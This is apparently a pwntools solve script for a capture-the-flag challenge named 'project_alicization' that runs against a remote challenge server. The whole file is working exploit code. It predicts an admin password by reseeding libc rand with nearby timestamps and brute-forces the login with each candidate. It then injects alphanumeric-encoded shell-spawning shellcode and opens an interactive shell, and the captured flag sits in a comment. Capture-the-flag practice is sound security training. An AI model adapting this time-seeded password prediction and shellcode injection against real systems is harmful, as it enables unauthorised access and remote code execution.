#!/usr/bin/env python3

from pwn import *
import sys
from typing import Union
from ctypes import CDLL
import pwnlib
from ae64 import AE64

binary = ELF("./project_alicization_patched")

context.binary = binary
context.terminal = ["tmux", "splitw", "-h", "-e", "GDB=pwndbg"]
context.arch = 'amd64'

def one_gadget(filename: str) -> list:
    return [int(i) for i in
            __import__('subprocess').check_output(['one_gadget', '--raw', filename]).decode().split(' ')]


GDB_SCRIPT = '''
b *$rebase(0x3D48)
'''.strip()


def conn() -> Union[process, remote]:
    io = None
    for arg in sys.argv[1:]:
        # ./solve <any option> d
        if arg == 'd':
            context.log_level = 'debug'
        # ./solve l
        if arg == 'l':
            io = process([binary.path])
        # ./solve g
        elif arg == 'g':
            io = gdb.debug([binary.path], gdbscript=GDB_SCRIPT)
    # $ ./solve
    if io is None:
        io = remote("ctf.adl.tw", 10008)
    return io


def main():
    io = conn()

    libc = CDLL("libc.so.6")

    now_time = libc.time(0)

    possible_passwords = []

    for off in range(now_time - 3, now_time + 1):
        libc.srand(off)

        password = b""

        for _ in range(20):
            rand_num = libc.rand()
            password += bytes([rand_num % 93 + 33])

        possible_passwords.append(password)
        info(f"Possible password: {password}")

    admin_password = None

    for password in possible_passwords:
        info(f"Trying password: {password}")
        io.sendlineafter(b": ", b"System Call login")
        io.sendlineafter(b": ", b"Quinella")
        io.sendlineafter(b": ", password)
        result = io.recvline()
        if b"You login with " in result:
            success(f"admin password found: {password}")
            admin_password = password
            break
    
    if admin_password is None:
        error("admin password not found")
        return
    
    io.sendlineafter(b": ", b"System Call generate shellcode element")
    shellcode = asm(shellcraft.sh())
    print(shellcode)
    # alphanumeric shellcode
    shellcode = AE64().encode(shellcode)
    print(shellcode)
    io.sendafter(b": ", shellcode)


    io.interactive() # ADL{5y573m_c4ll_GEN3R47E_fl4g_3l3M3NT.https://youtu.be/r-4XumkB2Yg}


if __name__ == "__main__":
    main()
